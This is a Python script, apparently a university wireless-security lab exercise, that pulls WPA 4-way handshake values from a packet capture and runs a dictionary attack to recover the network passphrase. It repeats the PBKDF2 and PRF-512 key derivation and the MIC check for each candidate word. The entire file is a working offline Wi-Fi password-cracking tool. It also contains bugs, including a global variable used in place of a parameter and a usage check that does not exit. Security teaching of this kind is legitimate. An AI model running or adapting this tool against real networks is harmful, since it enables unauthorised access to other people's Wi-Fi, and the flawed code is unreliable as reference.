#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Extract 4-way handshake info from pcap file

Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein, Tano Iannetta, Wojciech Myszkorowski"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib, sys


# Replace mic in data string
def replaceMIC(data, mic):

    l = len(mic)

    zeros = "0" * l
    return data.replace(mic,zeros)

# This function is used to get information needed for key derivation
# from pcap file (ssid, APmac, client mac, ap nonce, client nonce, MIC) for a given SSID
def getInfo(pcap, wantedSSID):

    networks = {}

    # 0 = ssid, 1 = APmac, 2= client mac, 3 = ap nonce, 4= client nonce, 5 = MIC, 6 = data
    network = [None] * 7
    clientMac = None
    eapolCount = 0

    for pkt in pcap:
        if pkt.haslayer(Dot11):
            # management trame and beacon
            if pkt.type == 0 and pkt.subtype == 8:
                if pkt.info not in network:
                    network[0] = pkt.info
                    APmac = pkt.addr2 # APMac address
                    network[1] = pkt.addr2.replace(":", "")

            # 4 way handshake
            elif pkt.haslayer(EAPOL):
                # if source is ap and replay_counter is 0
                if pkt.addr2 == APmac and int(b2a_hex(pkt[Raw].load[5:5 + 0x8]), 2) == 0: # key message 1 of 4
                    #print("Message 1 of 4")
                    clientMac = pkt.addr1  # Client MAC address, could be added on association request packet, done here to deal with less packets
                    network[2] = clientMac.replace(":", "")
                    network[3] = b2a_hex(pkt[Raw].load[13:13 + 0x20]) #AP nonce
                # if source is client and destination is AP and replay_counter is 0
                elif pkt.addr2 == clientMac and pkt.addr1 == APmac and int(b2a_hex(pkt[Raw].load[5:5 + 0x8]), 2) == 0: #key message 2 of 4
                    #print("Message 2 of 4")
                    network[4] = b2a_hex(pkt[Raw].load[13:13 + 0x20]) # Client Nonce
                # if source is AP, destionation is client and replay_counter is 1
                #elif pkt.addr2 == APmac and pkt.addr1 == clientMac and int(b2a_hex(pkt[Raw].load[5:5 + 0x8]), 2) == 1: # key message 3 of 4
                    #print("Message 3 of 4")
                    #network[3] = b2a_hex(pkt[Raw].load[13:13 + 0x20]) # AP Nonce
                # if source is client, destionation is AP and replay_counter is 1
                elif pkt.addr2 == clientMac and pkt.addr1 == APmac and int(b2a_hex(pkt[Raw].load[5:5 + 0x8]), 2) == 1: # key message 4 of 4
                    #print("Message 4 of 4")
                    network[5] = b2a_hex(pkt[Raw].load[77:77 + 16]) # MIC at the handshake's end

                    data = str(pkt[EAPOL]).encode('hex') # data needed for key derivation
                    # replace mic by 0's
                    network[6] = replaceMIC(data,network[5])

                eapolCount += 1

    # check for having complete 4 way handcheck
    if(eapolCount != 4):
        print("Could not have whole handshake")
        return None
    # Dictionnary {SSID: [SSID, APMac, ClientMAC, APNonce, ClientNonce, MIC, Data]}
    networks[network[0]] = network

    return networks[wantedSSID]

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def bruteforceAttack(ssid, APmac, Clientmac, ANonce, SNonce, data, mic ,dico):

    # convert format
    APmac = a2b_hex(APmac)
    Clientmac = a2b_hex(Clientmac)
    ANonce = a2b_hex(ANonce)
    SNonce = a2b_hex(SNonce)
    data  = a2b_hex(data)


    A = "Pairwise key expansion" # needed for key derivation
    B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    #read worldlist by line -> onr word by line
    try:
        with open(dico, "r") as ins:
            for line in ins:
                line = line[:-1] # remove \n
                print(line)

                #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
                pmk = pbkdf2_hex(line, ssid, 4096, 32)

                #expand pmk to obtain PTK
                ptk = customPRF512(a2b_hex(pmk),A,B)

                #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
                mic = hmac.new(ptk[0:16],data,hashlib.sha1)
                # check mic
                if str(info[5]) in mic.hexdigest():
                    print("Found right MIC: " + mic.hexdigest() + "\nPassphrase: " + line)
                    return line
    except:
        print("Could not open file")


if __name__ == '__main__':

    if len(sys.argv) != 2:
        print("usage: ./scaircrack dictionnary")


    wpa=rdpcap("wpa_handshake.cap")

    ssid = "SWI" # target network

    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    info = getInfo(wpa, ssid)

    print("Values extracted from pcap")
    print("==============================")
    print("SSID:\t" + info[0] + '\n')
    print("AP MAC:\t" +info[1] + '\n')
    print("Client MAC:\t" + info[2] + '\n')
    print("AP nonce:\t" + info[3] + '\n')
    print("Client nonce:\t" + info[4] + '\n')
    print("MIC:\t" + info[5] + '\n')

    print("==============================")
    print("Starting bruteforce attack")
    print("==============================")
    bruteforceAttack(info[0], info[1], info[2], info[3], info[4], info[6], info[5], sys.argv[1])
